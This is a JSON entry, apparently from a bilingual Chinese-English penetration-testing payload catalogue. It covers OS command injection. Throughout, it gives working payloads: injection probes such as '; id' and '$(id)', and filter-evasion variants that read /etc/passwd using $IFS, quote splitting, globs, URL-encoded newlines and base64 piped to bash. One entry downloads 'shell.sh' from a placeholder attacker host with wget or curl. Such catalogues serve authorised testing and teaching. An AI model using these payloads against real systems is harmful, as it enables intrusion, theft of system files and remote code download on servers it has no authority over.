    {
      "id": "rce-command-injection",
      "patches": [
        {
          "area": "execution",
          "index": 0,
          "expectedCommand": "; id\n| id\n`id`\n$(id)\n&& id\n|| id\ntest;id\ntest|id",
          "description": {
            "zh": "在注入点分别以 ;、|、反引号、$()、&&、|| 执行 id，探测命令注入点。命中判据：响应包含 id 的输出（uid=…）或与基线响应出现可辨识差异。",
            "en": "Execute id through ;, |, backticks, $(), &&, and || at the injection point to probe for command injection. Success check: the response contains id output (uid=...) or a recognizable difference from the baseline."
          },
          "title": {
            "zh": "探测命令注入",
            "en": "Validation step 1 for OS Command Injection Harmless Marker"
          }
        },
        {
          "area": "wafBypass",
          "index": 0,
          "expectedCommand": ";{cat,/etc/passwd}\n;cat$IFS/etc/passwd\n;cat</etc/passwd\n;cat%09/etc/passwd\n;cat${IFS}/etc/passwd",
          "description": {
            "zh": "用 {cat,..}、$IFS、重定向与 %09/${IFS} 等写法替代空格读取 /etc/passwd。命中判据：响应包含 /etc/passwd 内容（root:x:0:0:…）。",
            "en": "Replace spaces with {cat,..}, $IFS, redirection, and %09/${IFS} styles to read /etc/passwd. Success check: the response contains /etc/passwd content (root:x:0:0:...)."
          }
        },
        {
          "area": "wafBypass",
          "index": 1,
          "expectedCommand": "; c''at /etc/passwd\n; c\"\"at /etc/passwd\n; c\\at /etc/passwd\n; /bin/c?a?t /etc/passwd\n; /bin/ca[t] /etc/passwd",
          "description": {
            "zh": "用空引号、反斜杠与通配符拆分 cat 关键字后读取 /etc/passwd。命中判据：响应包含 /etc/passwd 内容且请求中未出现完整 cat 字样。",
            "en": "Split the cat keyword with empty quotes, backslashes, and globs, then read /etc/passwd. Success check: the response contains /etc/passwd content while the full string cat never appears in the request."
          },
          "syntaxBreakdown": [
            {
              "part": ";",
              "explanation": {
                "zh": "Linux命令分隔符",
                "en": "Linux command separator"
              },
              "type": "operator"
            },
            {
              "part": "c''at",
              "explanation": {
                "zh": "空引号拆分cat",
                "en": "Empty quotes split cat"
              },
              "type": "payload"
            },
            {
              "part": "c\\at",
              "explanation": {
                "zh": "反斜杠拆分命令名",
                "en": "Backslash splits command name"
              },
              "type": "payload"
            },
            {
              "part": "c?a?t",
              "explanation": {
                "zh": "问号通配匹配字符",
                "en": "Question-mark glob matches chars"
              },
              "type": "payload"
            },
            {
              "part": "ca[t]",
              "explanation": {
                "zh": "方括号通配等价cat",
                "en": "Bracket glob equals cat"
              },
              "type": "payload"
            }
          ]
        },
        {
          "area": "wafBypass",
          "index": 2,
          "expectedCommand": "; echo \"Y2F0IC9ldGMvcGFzc3dk\" | base64 -d | bash\n; $(printf \"\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\")",
          "description": {
            "zh": "以 Base64 管道解码或 printf 十六进制还原命令后执行 cat /etc/passwd。命中判据：响应包含 /etc/passwd 内容且明文命令未出现在请求中。",
            "en": "Rebuild cat /etc/passwd via a Base64 pipe or printf hex decoding and execute it. Success check: the response contains /etc/passwd content and no plaintext command appears in the request."
          }
        },
        {
          "area": "wafBypass",
          "index": 3,
          "expectedCommand": "whoami\nwhoami$IFS\nwh\\oami\nw'h'oami\nwhoami${IFS}\nwhoami${IFS:- }\nwhoami$IFS$IFS\ncat$IFS/flag\ncat${IFS}/flag\ncat${IFS:- }/flag\ncat$IFS$IFS/flag\nls$IFS/\nls${IFS}/\nls${IFS:- }/\nid$IFS\nid${IFS}\nid${IFS:- }\nuname$IFS-a\nuname${IFS}-a\nuname${IFS:- }-a\npwd$IFS\npwd${IFS}\npwd${IFS:- }\nhostname$IFS\nhostname${IFS}\nhostname${IFS:- }",
          "syntaxBreakdown": [
            {
              "part": "$IFS",
              "explanation": {
                "zh": "内部字段分隔符变量",
                "en": "Internal field separator variable"
              },
              "type": "value"
            },
            {
              "part": "${IFS:- }",
              "explanation": {
                "zh": "IFS为空时回退空格",
                "en": "Falls back to space when IFS empty"
              },
              "type": "payload"
            },
            {
              "part": "w'h'oami",
              "explanation": {
                "zh": "引号拆分命令名",
                "en": "Quote-split command name"
              },
              "type": "payload"
            },
            {
              "part": "wh\\oami",
              "explanation": {
                "zh": "反斜杠拆分命令名",
                "en": "Backslash-split command name"
              },
              "type": "payload"
            },
            {
              "part": "cat$IFS/flag",
              "explanation": {
                "zh": "IFS替代空格读flag",
                "en": "IFS replaces space to read flag"
              },
              "type": "payload"
            }
          ]
        },
        {
          "area": "wafBypass",
          "index": 4,
          "expectedCommand": "/bin/ca? /etc/passwd\n/bin/ca[s] /etc/passwd\n/bin/ca[t] /etc/passwd\n/usr/bin/wge? http://{ATTACKER_HOST}/shell.sh\n/usr/bin/cu?l http://{ATTACKER_HOST}/shell.sh\n/b?n/c?t /etc/passwd\n/b??/c?t /etc/passwd\n/*/c?t /etc/passwd\n/b*/c?t /etc/passwd",
          "syntaxBreakdown": [
            {
              "part": "/bin/ca?",
              "explanation": {
                "zh": "问号通配路径",
                "en": "Question-mark glob in path"
              },
              "type": "payload"
            },
            {
              "part": "/usr/bin/wge?",
              "explanation": {
                "zh": "wget路径通配变形",
                "en": "wget path glob variant"
              },
              "type": "payload"
            },
            {
              "part": "/b??/c?t",
              "explanation": {
                "zh": "多字符通配重组路径",
                "en": "Multi-char globs rebuild path"
              },
              "type": "payload"
            },
            {
              "part": "/*/c?t",
              "explanation": {
                "zh": "星号匹配任意目录",
                "en": "Star matches any directory"
              },
              "type": "payload"
            },
            {
              "part": "/etc/passwd",
              "explanation": {
                "zh": "目标文件路径",
                "en": "Target file path"
              },
              "type": "value"
            }
          ]
        },
        {
          "area": "wafBypass",
          "index": 6,
          "expectedCommand": "c%0aat /etc/passwd\nc%0d%0aat /etc/passwd\n;cat%09/etc/passwd\n;cat%0a/etc/passwd\n|cat%09/etc/passwd",
          "syntaxBreakdown": [
            {
              "part": "%0a",
              "explanation": {
                "zh": "URL编码换行符",
                "en": "URL-encoded newline"
              },
              "type": "payload"
            },
            {
              "part": "%0d%0a",
              "explanation": {
                "zh": "URL编码CRLF换行",
                "en": "URL-encoded CRLF"
              },
              "type": "payload"
            },
            {
              "part": "cat%09",
              "explanation": {
                "zh": "Tab替代空格分隔",
                "en": "Tab replaces space separator"
              },
              "type": "payload"
            },
            {
              "part": "/etc/passwd",
              "explanation": {
                "zh": "目标文件路径",
                "en": "Target file path"
              },
              "type": "value"
            }
          ]
        }
      ]
    },
